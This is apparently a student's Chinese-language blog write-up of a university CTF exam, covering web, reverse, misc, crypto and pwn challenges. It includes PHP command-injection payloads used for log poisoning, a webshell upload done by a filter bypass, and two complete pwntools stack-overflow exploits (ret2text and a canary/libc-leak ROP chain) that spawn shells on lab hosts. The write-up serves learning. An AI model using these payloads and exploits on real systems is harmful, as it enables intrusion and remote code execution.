---
title: HUST - 网安实践4结课CTF试题
image: "https://i.postimg.cc/sXXV0rFM/7c1252b73d14f048c18e847d38cd7a12.jpg"
published: 2024-12-19
description: 2022届网安实践4CTF试题
tags: [CTF, HUST]
category: CTF
draft: false
---

由于课程关闭，无法进行复现，因此主要使用语言描述。

## Web1-简单文件上传

看源码发现过滤了php等关键词，但是处理的时候只删除了一次，所以可以进行双写绕过。传入木马文件后蚁剑连接得到flag。

## Web2-文件包含进阶

通过 POST 请求传入 hust=/var/log/apache2/access.log，设置 User-Agent 为 \<?php system("ls")?\>成功看到回显，再次传入\<?php system("cat fl4g.php");?\>，得到flag。

## Reverse1-我的ida怎么坏了

课程原题，不再重复。

## Reverse2-带衣服的程序

看了一眼，发现套了upx壳，使用upx -d脱壳。

## MISC1-我的报告呢

根据提示是pdf文件，在流量包中找到文件，此外还在myname里找到了pdf的密码。打开pdf后没有啥有效信息，一开始以为是wbStego4.3open加密，结果弄不出来，最后把它转成了word，

![image-20241202150333684](assets\image-20241202150333684.png)

## MISC2-BB空间

伪加密，修正后解压得到二维码，依据各个文件名确定位置拼出二维码，扫描后得到一串数字，结合题目，在bilibili中搜索，找到一个用户，定位到他的最新视频。发现在视频简介中说明了视频中每个句子对应的符号。下载音频用audacity比对摘写，得到一串摩斯密码，解码后得到flag。

## Crypto1-奇怪的RSA

写完以后跑了一下发现有问题，说是没有逆，猜测是ehephi不互素了，验证了一下发现e和q-1不互素。改一下代码，转化到模p下来求解。

```python
# coding=gbk
import gmpy2
from Crypto.Util.number import *
from math import ceil, sqrt
from random import choice
from gmpy2 import *
e = 65537
p = 7861284553623919323985859832007323477428670056827930254749054233285002288342251190742960221895692365421571559655657906508077200676209583363642503410091987
q = 12190036856294802286447270376342375357864587534233715766210874702670724440751066267168907565322961270655972226761426182258587581206888580394726683112820379
c = 82847779812851057890043530756832889487859832046106654912667214872414017036311911272053848097280235944007447512360040509400105818809700630697569934731411705662409382305951636397690516111461818016905840116265739235873533920070957680510890443904586797027770509200983712548635748894266511224103615999307792279118
n = p*q
# _gcd = gcd(e,(p-1)*(q-1)) # 65537
gcd_q = gcd(e,p-1) # 1

d = inverse(e,p-1)
m = pow(c,d,p)
print(long_to_bytes(int(m)))
```

## Crypto2-AES加密

## PWN1-ret2text

常规栈溢出，程序也给了system和/bin/sh。

```python
from pwn import *
context(arch='amd64',os='linux',log_level='debug')

#p = process("./2pwn.bin")
p = remote('172.17.0.15',17831)

binsh = 0x4023FF
system = 0x401B21
pop_rdi_ret = 0x401c73

payload = b'a'*72+p64(pop_rdi_ret)+p64(binsh)+p64(system)
p.sendline(payload)

p.interactive()
```



## PWN2-canary

程序没有给system或/bin/sh，也没说libc版本。所以要利用puts泄露libc版本和libc基址。

```python
from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='debug')

p = process("./pwn.bin")
elf = ELF("./pwn.bin")
#p = remote('172.17.0.15',14375)

pop_rdi = 0x401343
ret=0x40101a
binsh = 0x404058
system=0x4010b0

payload1=b'a'*72
p.sendlineafter('name?',payload1)

p.recvuntil(b'a'*72)
canary=u64(p.recv(8))-0xa

print(hex(canary))

payload = cyclic(72)+p64(canary)+p64(0)+p64(pop_rdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(elf.sym["main"])

p.sendlineafter('stack!',payload)

puts = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts))

libc=LibcSearcher("puts",puts)

libcbase=puts-libc.dump('puts')
system=libcbase+libc.dump('system')
binsh=libcbase+libc.dump('str_bin_sh')
print(hex(system))
print(hex(binsh))

payload=cyclic(72)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)
p.sendlineafter('name?',b'1')
p.sendlineafter('stack!',payload)
p.interactive()
```

